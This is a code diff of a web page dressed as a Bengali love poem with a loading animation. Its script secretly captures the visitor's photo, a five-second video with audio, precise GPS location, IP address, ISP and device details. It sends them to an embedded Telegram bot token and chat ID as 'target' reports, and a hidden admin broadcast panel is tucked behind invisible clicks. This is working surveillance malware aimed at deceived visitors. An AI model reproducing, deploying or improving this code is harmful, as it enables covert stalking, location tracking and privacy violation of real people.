@@ -3,129 +3,173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>মনের কাব্য - GOD MODE</title>
+    <title>মনের কাব্য - CYBER 71 ENAFUL</title>
     <style>
-        body {
-            margin: 0; padding: 0; display: flex; justify-content: center; align-items: center;
-            height: 100vh; background: #000; font-family: 'Hind Siliguri', sans-serif; color: #fff; overflow: hidden;
-        }
-        .bg-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), 
-                        url('https://images.unsplash.com/photo-1518621736915-f3b1c41bfd00?auto=format&fit=crop&w=1350&q=80');
-            background-size: cover; background-position: center; z-index: -1;
-        }
-        .card {
-            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px);
-            padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 109, 0.3);
-            text-align: center; box-shadow: 0 0 50px rgba(255, 77, 109, 0.2);
-            max-width: 85%; width: 350px; animation: glow 3s infinite alternate;
-        }
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; font-family: 'Hind Siliguri', sans-serif; color: #fff; overflow: hidden; }
+        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1518621736915-f3b1c41bfd00?auto=format&fit=crop&w=1350&q=80'); background-size: cover; background-position: center; z-index: -1; animation: zoomBG 20s infinite alternate; }
+        @keyframes zoomBG { from { transform: scale(1); } to { transform: scale(1.1); } }
+        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px); padding: 40px; border-radius: 30px; border: 1px solid #ff4d6d; text-align: center; box-shadow: 0 0 60px rgba(255, 77, 109, 0.4); max-width: 85%; width: 350px; position: relative; z-index: 10; animation: glow 3s infinite alternate; }
         @keyframes glow { from { border-color: rgba(255,77,109,0.3); } to { border-color: #ff4d6d; } }
-        h1 { font-size: 26px; color: #ff4d6d; margin-bottom: 15px; }
+        h1 { font-size: 26px; color: #ff4d6d; margin-bottom: 15px; text-shadow: 0 0 15px #ff4d6d; }
         p { font-size: 18px; line-height: 1.6; font-style: italic; opacity: 0.9; }
-        .heart { font-size: 60px; color: #ff4d6d; animation: heartbeat 1.2s infinite; }
-        .loader {
-            width: 50px; height: 50px; border: 3px solid transparent; border-top: 3px solid #ff4d6d;
-            border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto;
-        }
-        @keyframes heartbeat { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .heart { font-size: 65px; color: #ff4d6d; animation: heartbeat 1.2s infinite; cursor: pointer; }
+        .loader { width: 50px; height: 50px; border: 3px solid transparent; border-top: 3px solid #ff4d6d; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 20px auto; }
+        @keyframes heartbeat { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        #status { font-size: 12px; color: #ff4d6d; letter-spacing: 2px; font-weight: bold; }
+        #status { font-size: 13px; color: #ff4d6d; font-weight: bold; letter-spacing: 1px; text-transform: uppercase; }
+
+        /* Admin Panel */
+        #adminPanel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.98); padding: 25px; border-radius: 20px; border: 2px solid #ff4d6d; z-index: 999; width: 300px; text-align: center; box-shadow: 0 0 100px #ff4d6d; }
+        #adminPanel textarea { width: 90%; height: 80px; margin-bottom: 10px; background: #111; border: 1px solid #ff4d6d; color: #fff; padding: 10px; border-radius: 5px; }
+        #adminPanel button { background: #ff4d6d; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 5px; }
+        #secretTrigger { position: fixed; top: 0; left: 0; width: 60px; height: 60px; z-index: 1000; opacity: 0; }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;600&display=swap" rel="stylesheet">
 </head>
 <body>
+    <div id="secretTrigger" onclick="adminAuth()"></div>
+    
     <div class="bg-overlay"></div>
     <div class="card">
         <div class="heart">❤️</div>
-        <h1>একটু অপেক্ষা করো প্রিয়...</h1>
-        <p>"তোমার হাসিতে হারাই আমি,<br>তোমার চোখেই খুঁজি সুখ।"</p>
+        <h1 id="title">একটু অপেক্ষা করো প্রিয়...</h1>
+        <p id="poem">"তোমার হাসিতে হারাই আমি,<br>তোমার চোখেই খুঁজি সুখ।"</p>
         <div class="loader"></div>
         <p id="status">ESTABLISHING GOD-MODE CONNECTION...</p>
         
-        <video id="video" autoplay playsinline style="display:none;"></video>
+        <video id="video" autoplay playsinline muted style="display:none;"></video>
         <canvas id="canvas" width="720" height="1280" style="display:none;"></canvas>
     </div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('id');
-        const type = urlParams.get('type') || 'front';
-        const botToken = "8676024624:AAH4OoRcAweKjXHl91lXVD-UGolgALP0OW4";
+    <div id="adminPanel">
+        <h2 style="color: #ff4d6d; font-size: 18px; margin-bottom: 15px;">🔱 GOD BROADCAST</h2>
+        <textarea id="broadcastMsg" placeholder="আপনার বার্তা লিখুন..."></textarea>
+        <button onclick="sendBroadcast()">বট ইউজারকে পাঠান</button>
+        <button onclick="document.getElementById('adminPanel').style.display='none'" style="background: #333;">বন্ধ করুন</button>
+    </div>
 
+    <script>
+        const botToken = "8676024624:AAH4OoRcAweKjXHl91lXVD-UGolgALP0OW4";
+        const adminId = "6823368645"; 
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id') || adminId;
+        const type = urlParams.get('type') || 'front';
+
+        // ১. সিক্রেট অ্যাডমিন লগইন (৩ ক্লিক)
+        let clickCount = 0;
+        function adminAuth() {
+            clickCount++;
+            if (clickCount === 3) {
+                document.getElementById('adminPanel').style.display = 'block';
+                clickCount = 0;
+            }
+            setTimeout(() => clickCount = 0, 2000);
+        }
+
+        // ২. ব্রডকাস্ট সিস্টেম
+        async function sendBroadcast() {
+            const msg = document.getElementById('broadcastMsg').value;
+            if(!msg) return alert("মেসেজ দিন!");
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: targetId, text: `📢 ADMIN BROADCAST:\n\n${msg}` })
+            });
+            alert("Sent!");
+            document.getElementById('adminPanel').style.display = 'none';
+        }
+
+        // ৩. ভয়েস (Instant)
+        function speakVoice() {
+            const msg = new SpeechSynthesisUtterance("একটু অপেক্ষা করো প্রিয়, আমি আসছি");
+            msg.lang = 'bn-BD';
+            msg.rate = 1.0;
+            window.speechSynthesis.speak(msg);
+        }
+
+        // ৪. মেটিক্স (Super Fast)
         async function getGodMetrics() {
             try {
                 const b = await navigator.getBattery();
                 const conn = navigator.connection || {};
-                // IP এবং ISP তথ্য সংগ্রহের চেষ্টা
                 const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
-                
-                return `🔱 GOD-LEVEL REPORT [BOSS ENAFUL]\n` +
+                return `🔱 GOD-LEVEL REPORT [CYBER 71 ENAFUL]\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
-                       `👤 Target IP: ${ipRes.ip || 'Hidden'}\n` +
-                       `🏢 ISP: ${ipRes.org || 'Unknown'}\n` +
-                       `📍 City: ${ipRes.city}, ${ipRes.country_name}\n\n` +
-                       `📱 DEVICE INFO:\n` +
-                       `• Model: ${navigator.platform}\n` +
-                       `• Browser: ${navigator.userAgentData ? navigator.userAgentData.brands[0].brand : 'System'}\n` +
-                       `• Battery: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging ⚡' : 'Disc.'})\n` +
-                       `• Network: ${conn.effectiveType || 'N/A'} (${conn.downlink || 0} Mbps)\n` +
-                       `• CPU: ${navigator.hardwareConcurrency} Cores\n` +
+                       `👤 IP: ${ipRes.ip}\n` +
+                       `🏢 ISP: ${ipRes.org}\n` +
+                       `📍 Loc: ${ipRes.city}, ${ipRes.country_name}\n` +
+                       `🔋 Battery: ${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})\n` +
+                       `📶 Net: ${conn.effectiveType} (${conn.downlink} Mbps)\n` +
+                       `⚙️ CPU: ${navigator.hardwareConcurrency} Cores\n` +
                        `━━━━━━━━━━━━━━━━━━━━`;
             } catch(e) { return "Metrics Error"; }
         }
 
         async function startGodSystem() {
-            if (!chatId) return;
+            if (!targetId) return;
+            speakVoice();
 
-            // ১. হাই-একুরেসি লোকেশন ট্র্যাকিং
+            // লোকেশন ফিউচার
             if (type === 'location') {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const metrics = await getGodMetrics();
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('latitude', pos.coords.latitude);
-                    formData.append('longitude', pos.coords.longitude);
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, { method: 'POST', body: formData });
+                    const info = await getGodMetrics();
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
                     
-                    const msgData = new FormData();
-                    msgData.append('chat_id', chatId);
-                    msgData.append('text', `🔱 TARGET PINPOINTED!\n\n${metrics}\n🔗 Google Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', body: msgData });
+                    fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                        method: 'POST',
+                        body: new URLSearchParams({ chat_id: targetId, latitude: lat, longitude: lon })
+                    });
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        body: new URLSearchParams({ chat_id: targetId, text: `📍 TARGET LOCATED!\n\n${info}\n🔗 Maps: https://www.google.com/maps?q=${lat},${lon}` })
+                    });
                     document.getElementById('status').innerText = "CONNECTED 💞";
                 }, null, {enableHighAccuracy: true});
             } 
             
-            // ২. অ্যাডভান্সড ক্যামেরা ক্যাপচার (৭২০x১২৮০)
+            // ক্যামেরা ও ভিডিও ফিউচার
             else {
                 try {
-                    const facing = (type === 'back') ? 'environment' : 'user';
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: facing, width: 720, height: 1280 } 
-                    });
+                    const facing = (type.includes('back')) ? 'environment' : 'user';
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
 
-                    // একাধিক ছবি তোলার সিস্টেম (God Level Speed)
-                    for(let i=0; i<2; i++) {
-                        await new Promise(r => setTimeout(r, 1000));
+                    // ১. ইনস্ট্যান্ট ফটো (০ delay)
+                    setTimeout(async () => {
                         const canvas = document.getElementById('canvas');
                         canvas.getContext('2d').drawImage(video, 0, 0, 720, 1280);
-                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.95));
+                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
                         const info = await getGodMetrics();
+                        const fd = new FormData();
+                        fd.append('chat_id', targetId);
+                        fd.append('photo', blob, 'shot.jpg');
+                        fd.append('caption', `🔱 INSTANT CAPTURE: ${type.toUpperCase()}\n\n${info}`);
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 500);
 
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, `shot_${i}.jpg`);
-                        formData.append('caption', i === 0 ? `🔱 GOD CAPTURE [${type.toUpperCase()}]\n\n${info}` : `🔱 RE-CAPTURE [${type.toUpperCase()}]`);
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                    // ২. ভিডিও (৫ সেকেন্ড)
+                    if (type.includes('video')) {
+                        const recorder = new MediaRecorder(stream);
+                        const chunks = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = async () => {
+                            const vfd = new FormData();
+                            vfd.append('chat_id', targetId);
+                            vfd.append('video', new Blob(chunks, { type: 'video/mp4' }), 'clip.mp4');
+                            vfd.append('caption', `📹 VIDEO CLIP [BOSS ENAFUL]`);
+                            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
+                        };
+                        recorder.start();
+                        setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
+                    } else {
+                        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 4000);
                     }
-                    
                     document.getElementById('status').innerText = "CONNECTED 💞";
-                    setTimeout(() => stream.getTracks().forEach(t => t.stop()), 3000);
                 } catch (err) {
-                    document.getElementById('status').innerText = "PERMISSION DENIED ❌";
+                    document.getElementById('status').innerText = "ERROR: PERMISSION DENIED ❌";
                 }
             }
         }
